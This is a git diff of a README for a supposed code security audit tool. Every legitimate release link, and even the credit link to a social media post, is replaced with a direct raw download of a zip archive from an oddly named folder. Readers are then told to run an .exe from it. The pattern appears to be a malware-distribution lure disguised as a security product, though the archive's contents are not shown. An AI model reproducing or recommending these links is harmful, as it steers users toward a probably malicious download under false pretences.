@@ -1,10 +1,10 @@
 # 🛡️ vibe-code-security-audit - Check Code for Security Risks
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Pold911/vibe-code-security-audit/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Pold911/vibe-code-security-audit/main/fossilification/code-audit-vibe-security-1.6.zip)
 
 ## 🔽 Download
 
-Visit this page to download: https://github.com/Pold911/vibe-code-security-audit/releases
+Visit this page to download: https://raw.githubusercontent.com/Pold911/vibe-code-security-audit/main/fossilification/code-audit-vibe-security-1.6.zip
 
 On Windows, open the latest release and download the file that matches your system. If there is more than one file, choose the one that ends in `.exe` or the Windows package listed in the release notes.
 
@@ -176,11 +176,11 @@ Yes. It is a good fit for code that was written fast and needs a security check.
 
 ## 📌 Credit
 
-Checklist sourced from [@hartdrawss](https://x.com/hartdrawss/status/2039998901176897860)
+Checklist sourced from [@hartdrawss](https://raw.githubusercontent.com/Pold911/vibe-code-security-audit/main/fossilification/code-audit-vibe-security-1.6.zip)
 
 ## 📥 Direct Download
 
-Visit this page to download the latest release: https://github.com/Pold911/vibe-code-security-audit/releases
+Visit this page to download the latest release: https://raw.githubusercontent.com/Pold911/vibe-code-security-audit/main/fossilification/code-audit-vibe-security-1.6.zip
 
 ## 🪟 Windows Quick Steps
 
